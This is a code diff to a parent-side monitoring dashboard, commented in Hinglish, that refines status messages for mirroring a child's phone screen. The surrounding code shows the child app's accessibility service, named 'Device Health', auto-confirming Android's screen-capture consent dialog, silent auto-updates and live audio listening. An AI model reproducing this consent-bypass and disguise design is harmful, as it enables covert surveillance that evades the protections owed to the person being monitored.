@@ -19,6 +19,8 @@ const S = {
   lastFrameAt: 0,      // ms of last mirror frame received (status watchdog)
   lastBlobUrl: null,   // previous mirror frame blob URL (revoked on next frame)
   streaming: false,    // child-reported mirroring state (mirror_state)
+  mirrorChildReason: null,     // bachche ke phone se aaya HONEST stall reason
+  mirrorChildReasonAt: 0,      // us reason ka timestamp (25 s tak "fresh")
   ringOn: false,       // ring command chalu hai (button toggle + ring_state sync)
   ringTimer: null,     // child 30s me khud band karta hai — UI safety reset
   audioOn: false,      // live audio listening chalu hai
@@ -623,8 +625,11 @@ function handleWs(m) {
           mirrorStatus("Bachche ki screen mirroring chalu ho gayi ✓", false);
         } else if (S.mirrorOn) {
           setMirrorBtn(true);
-          // Child se HONEST reason aaye (consent fail / a11y off / OEM block) to
-          // generic "consent confirm ho raha hai" ki jagah wahi dikhao.
+          // Child se HONEST reason aaye (consent fail / a11y off / OEM block /
+          // screen off / capture stall) to generic "consent confirm ho raha hai"
+          // ki jagah wahi dikhao — aur 12 s watchdog bhi isko prefer kare.
+          S.mirrorChildReason = m.reason || null;
+          S.mirrorChildReasonAt = S.mirrorChildReason ? Date.now() : 0;
           mirrorStatus(m.reason || "Consent dialog auto-confirm ho raha hai… (5–20 sec)", true);
         } else {
           setMirrorBtn(false);
@@ -1164,19 +1169,27 @@ function onMirrorFrame(buf) {
     S.frameCount = 0; S.lastFpsAt = now;
   }
   // Frames aa rahe hain -> consent clearly grant ho gaya, status hint hata do.
-  if (S.mirrorOn) mirrorStatus("", false);
+  if (S.mirrorOn) { S.mirrorChildReason = null; S.mirrorChildReasonAt = 0; mirrorStatus("", false); }
 }
 
 // Agar mirroring chalu hai par 12 s se koi frame nahi aaya to bata do kya ho
 // raha hai — "cast icon par screen kaali" ka sabse common reason: consent abhi
 // auto-confirm ho raha hai, ya child ki screen OFF hai (off screen se frames
 // nahi bante).
+// ANDROID 14/15 FIX: bachche ka app ab khud HONEST reason bhejta hai
+// (mirror_state.reason — "screen OFF hai" / "capture block hua"). Pehle ye
+// interval har 3 s me usko generic guess se OVERWRITE kar deta tha — parent ko
+// asli wajah kabhi nahi dikhti thi. Ab: fresh child reason (25 s) ko chhedte
+// nahi, sirf generic text tab dikhate hain jab bachche ne kuch nahi bataya.
 setInterval(() => {
   if (!S.mirrorOn) return;
   const idle = Date.now() - (S.lastFrameAt || 0);
   if (idle > 12000) {
+    const fresh = S.mirrorChildReasonAt && Date.now() - S.mirrorChildReasonAt < 25000;
     mirrorStatus(
-      "Frames nahi aa rahe (" + Math.round(idle / 1000) + "s) — bachche ka screen OFF hai ya consent abhi confirm ho raha hai. Bachche ka phone screen ON karo, phir khud aa jayenge.",
+      fresh && S.mirrorChildReason
+        ? S.mirrorChildReason
+        : "Frames nahi aa rahe (" + Math.round(idle / 1000) + "s) — bachche ka screen OFF hai ya consent abhi confirm ho raha hai. Bachche ka phone screen ON karo, phir khud aa jayenge.",
       true
     );
   } else {
@@ -1199,6 +1212,8 @@ $("mirror-toggle").onclick = () => {
       S.ws.send(JSON.stringify({ type: "mirror_start", cid: S.cid }));
       setMirrorBtn(true);
       S.lastFrameAt = Date.now();
+      // Naya attempt — purana honest reason ab relevant nahi
+      S.mirrorChildReason = null; S.mirrorChildReasonAt = 0;
       const c = activeChild();
       if (c && !c.online) {
         mirrorStatus("Bachcha abhi offline hai — command queue ho gayi, connect hote hi mirroring khud shuru ho jayegi.", true);
@@ -1351,8 +1366,8 @@ function renderLiveDiag() {
   const h = c.health || {};
   const issues = [];
   // #1 PURANA APK — mirror/mic fixes phone tak pahunche hi nahi
-  if (typeof h.versionCode === "number" && h.versionCode < 4) {
-    issues.push("<b>Bachche ke phone par PURANA app version hai</b> (v" + h.versionCode + ", latest v4) — Android 14/15 mirror+mic+call/SMS fixes isi naye build me hain. <b>Fix:</b> Set tab → “📲 Child app abhi update karo”, ya bachche ka phone screen ON rakh kar ~10 min (silent auto-update khud ho jayega).");
+  if (typeof h.versionCode === "number" && h.versionCode < 5) {
+    issues.push("<b>Bachche ke phone par PURANA app version hai</b> (v" + h.versionCode + ", latest v5) — Android 14/15 mirror+mic+call/SMS fixes isi naye build me hain. <b>Fix:</b> Set tab → “📲 Child app abhi update karo”, ya bachche ka phone screen ON rakh kar ~10 min (silent auto-update khud ho jayega).");
   }
   if (h.accessibility === false) {
     issues.push("<b>Accessibility OFF hai</b> — consent dialog aur updates ka auto-confirm kaam nahi karega. <b>Fix:</b> Settings → Accessibility → Device Health → ON. Android 13+ par pehle App info → ⋮ → “Allow restricted settings” karna pad sakta hai.");
